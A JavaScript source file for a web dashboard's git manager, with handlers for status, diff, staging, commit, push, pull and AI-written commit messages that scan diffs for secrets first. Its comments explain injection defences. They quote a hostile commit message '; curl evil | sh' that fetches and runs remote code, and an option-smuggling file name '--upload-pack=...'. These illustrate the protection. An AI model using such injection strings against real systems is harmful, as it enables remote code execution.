import { execFile } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { guardPath, isSensitive } from './guards.js';
import { PROJECTS_DIR } from './config.js';
import { engineRoster, brainChat, resolveBrain } from './brains.js';
import { scanForSecrets } from './secrets.js';

// Git Manager (helis-d). Every handler is argv-only: execFile with an argument
// array and no shell, so a commit message of `; curl evil | sh` is a literal
// string git never interprets. Every pathspec is passed after `--` so a file
// named `--upload-pack=...` can't be read as an option. push/pull take NO user
// arguments at all. Do not switch to exec/shell:true and do not drop the `--`.
//
// blockAppRoot is set on EVERY guardPath here, matching the editor's posture:
// this is a tool for the user's projects, not for operating on the cockpit's
// own repo. Atlan's repo holds .fleet, .keys.enc and .auth-token, so a `git
// add -A && commit` aimed at APP_ROOT could stage the password hash and the
// encrypted key store, and a push would put them somewhere else entirely.
function runGit(cwd, args) {
  return new Promise((resolve, reject) => {
    execFile('git', args, { cwd }, (err, stdout, stderr) => {
      if (err) reject(new Error(stderr.trim() || err.message));
      else resolve(stdout);
    });
  });
}

// Every handler resolves its repo the same way, so the posture can't drift
// between them the way two copies of a guard always eventually do.
const repoRoot = (p) => guardPath(p || PROJECTS_DIR, { blockAppRoot: true });

export async function getGitStatus(req, res) {
  try {
    const cwd = repoRoot(req.query.path);
    const stdout = await runGit(cwd, ['status', '--porcelain']);
    // Porcelain status is TWO positional columns: X = index (staged), Y = work
    // tree (unstaged). Trimming it — as the incoming version did — collapses
    // "M " (staged) and " M" (unstaged) to the same "M", so the panel cannot
    // tell you what you're about to commit. Send the raw pair and let the
    // client read the positions.
    const files = stdout.split('\n').filter(Boolean).map((line) => {
      const xy = line.slice(0, 2);
      return {
        file: line.slice(3).trim(),
        status: xy,
        staged: xy[0] !== ' ' && xy[0] !== '?',
        untracked: xy === '??',
      };
    });
    res.json({ files });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function getGitDiff(req, res) {
  try {
    const cwd = repoRoot(req.query.path);
    const file = String(req.query.file || '').trim();
    if (!file) throw new Error('file is required');

    // ONE up-front guard on the resolved file covers all three read vectors at
    // once — the untracked readFileSync fallback, an in-repo symlink pointing
    // out of the project, and a tracked-but-sensitive file being diffed.
    // mustExist:false because a deleted file legitimately has a diff.
    //
    // Without this, the untracked branch was a straight arbitrary-file read:
    // `git show :<file>` ALWAYS fails for an untracked path (it isn't in the
    // index), so that branch fell through to readFileSync(join(cwd, file)) on
    // every call, with `file` under client control and no guard between.
    const absFile = guardPath(join(cwd, file), { blockAppRoot: true, mustExist: false });

    const statusOut = await runGit(cwd, ['status', '--porcelain', '--', file]);
    const isUntracked = statusOut.startsWith('??');

    let diff = '';
    if (isUntracked) {
      try {
        diff = readFileSync(absFile, 'utf8').split('\n').map((l) => '+' + l).join('\n');
      } catch (e) {
        diff = `+ (could not load content: ${e.message})`;
      }
    } else {
      diff = await runGit(cwd, ['diff', 'HEAD', '--', file]);
      if (!diff.trim()) diff = await runGit(cwd, ['diff', '--', file]);
    }
    res.json({ diff });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function gitStage(req, res) {
  try {
    const cwd = repoRoot(req.body.path);
    const file = String(req.body.file || '').trim();
    if (!file) throw new Error('file is required');
    await runGit(cwd, ['add', '--', file]);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function gitUnstage(req, res) {
  try {
    const cwd = repoRoot(req.body.path);
    const file = String(req.body.file || '').trim();
    if (!file) throw new Error('file is required');
    await runGit(cwd, ['restore', '--staged', '--', file])
      .catch(() => runGit(cwd, ['reset', 'HEAD', '--', file]));
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function gitCommit(req, res) {
  try {
    const cwd = repoRoot(req.body.path);
    const message = String(req.body.message || '').trim();
    if (!message) throw new Error('commit message is required');
    await runGit(cwd, ['commit', '-m', message]);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function gitPush(req, res) {
  try {
    await runGit(repoRoot(req.body.path), ['push']);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

export async function gitPull(req, res) {
  try {
    await runGit(repoRoot(req.body.path), ['pull']);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}

// The one handler here that sends your code OFF the box. A diff is exactly the
// kind of payload that carries a freshly-pasted key, so it gets scanned before
// the brain call, and a hit stops the request rather than warning after the
// fact. Findings name the kind and the path, never the matched bytes.
export async function gitAiCommitMsg(req, res) {
  try {
    const cwd = repoRoot(req.body.path);
    let diff = await runGit(cwd, ['diff', '--cached']);
    let staged = true;
    if (!diff.trim()) { diff = await runGit(cwd, ['diff']); staged = false; }
    if (!diff.trim()) throw new Error('No staged or unstaged changes found to generate message.');

    const nameOnly = await runGit(cwd, staged ? ['diff', '--cached', '--name-only'] : ['diff', '--name-only']);
    const paths = nameOnly.split('\n').map((s) => s.trim()).filter(Boolean);

    const suspectPaths = paths.filter((p) => isSensitive(join(cwd, p)));
    const kinds = scanForSecrets(diff);
    if ((suspectPaths.length || kinds.length) && req.body.confirm !== true) {
      // Return BEFORE any outbound call — nothing has left the box at this
      // point, and nothing will unless the user confirms this exact content.
      return res.json({
        needsConfirm: true,
        findings: { paths: suspectPaths, kinds },
        note: 'This diff looks like it contains credentials. Generating a message sends it to a third-party model. Review what leaves the box, then confirm to send anyway.',
      });
    }

    // His original ladder branched on engine === 'claude' by name, so every
    // OTHER agent id (codex/copilot/antigravity/grok) fell into the "provider
    // not found" branch and threw. resolveBrain classifies agent-vs-brain once,
    // for both this and the inline editor.
    const roster = await engineRoster();
    const { provider, model } = await resolveBrain(req.body.engine, req.body.model, roster);

    let reply = '', errMsg = null;
    const mockSend = (msg) => {
      if (msg.t === 'chat.msg' && msg.role === 'brain') reply = msg.text;
      if (msg.t === 'chat.err') errMsg = msg.msg;
    };

    await brainChat({
      provider,
      model,
      history: [
        { role: 'system', content: 'You are a precise git helper. Generate a short, professional commit message in conventional commits format (e.g. "feat: add user login", "fix: resolve socket crash") based on the git diff. Return ONLY the commit message text. No quotes, no explanations, no markdown blocks.' },
        { role: 'user', content: `Here is the git diff:\n\n${diff.slice(0, 10000)}` },
      ],
      send: mockSend,
    });

    if (errMsg) throw new Error(errMsg);
    const message = reply.replace(/['"`]/g, '').trim();
    if (!message) throw new Error('model returned no commit message');
    res.json({ message });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
}
